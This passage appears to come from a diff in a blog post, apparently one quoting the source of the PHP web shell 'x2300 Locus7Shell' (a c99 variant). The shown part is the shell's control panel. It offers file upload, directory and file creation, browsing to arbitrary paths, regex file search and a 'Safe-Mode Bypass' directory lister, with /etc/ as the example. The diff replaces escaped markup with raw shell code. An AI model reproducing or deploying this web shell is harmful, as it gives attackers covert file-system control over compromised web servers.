-&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Upload&lt;form method="POST" ENCTYPE="multipart/form-data"&gt;&lt;input type=hidden name=act value="upload"&gt;&lt;input type="file" name="uploadfile"&gt;&lt;input type=hidden name="miniform" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Upload"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make Dir&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="mkdir"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make File&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"&gt;&lt;input type=hidden name="ft" value="edit"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go Dir&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="ls"&gt;&lt;input type="text" name="d" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go File&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="f" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[ x2300 Locus7Shell v. <?php echo $shver; ?> &lt;a href="http://www.locus7s.com/"&gt;&lt;u&gt;&lt;b&gt;Modded by&lt;/b&gt;&lt;/u&gt;&lt;/a&gt; #!physx^  | &lt;a href="http://www.locus7s.com"&gt;www.LOCUS7S.com&lt;/font&gt;&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); c99shexit(); ?>
+          <br>
+      </div>
+    </form>
+    </td>
+  <td width="50%" height="83" valign="top"><center>
+   <center>Php Safe-Mode Bypass (List Directories):     <form action="<?php echo $surl; ?>">
+      <div align="center"><br>
+      Dir: <input type="text" name="directory" method="get"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br>
+    </form></center>
+    </td>
+</tr></TABLE>
+<br>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr>
+<td width="50%" height="1" valign="top"><center>Search<form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
+<td width="50%" height="1" valign="top"><center>Upload<form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>
+</tr>
+</table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>Make Dir<form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center>Make File<form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>Go Dir<form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center>Go File<form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ x2300 Locus7Shell v. <?php echo $shver; ?> <a href="http://www.locus7s.com/"><u><b>Modded by</b></u></a> #!physx^  | <a href="http://www.locus7s.com">www.LOCUS7S.com</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
+</body></html><?php chdir($lastdir); c99shexit(); ?>
 {% endhighlight %}
 
  [1]: http://www.petitiononline.com/locus7s/petition.html "Locus7s petition"
